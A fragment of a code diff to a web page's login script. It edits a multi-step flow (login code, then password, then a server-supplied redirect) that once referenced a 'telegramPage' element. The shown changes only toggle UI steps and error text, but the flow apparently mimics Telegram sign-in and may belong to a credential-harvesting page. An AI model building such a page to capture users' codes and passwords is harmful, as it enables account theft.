                         document.getElementById('step2').classList.add('hidden');
                         document.getElementById('step3').classList.remove('hidden');
                         document.getElementById('codeResult').textContent = '';
+                        document.getElementById('result').textContent = '';
                     } else {
                         document.getElementById('codeResult').textContent = 'Incorrect login code. Please try again.';
                     }
@@ -1261,6 +1263,7 @@
                             window.location.replace(data.redirect);
                         }, 0);
                     } else {
+                        // Display the error message right after the password input
                         document.getElementById('passwordResult').textContent = 'Incorrect password. Please try again.';
                     }
                 },
@@ -1272,8 +1275,9 @@
 
         function goBack() {
             document.getElementById('step2').classList.add('hidden');
-            document.getElementById('telegramPage').classList.remove('hidden');
+            document.getElementById('step1').classList.remove('hidden');
         }
     </script>
 </body>
+
 </html>
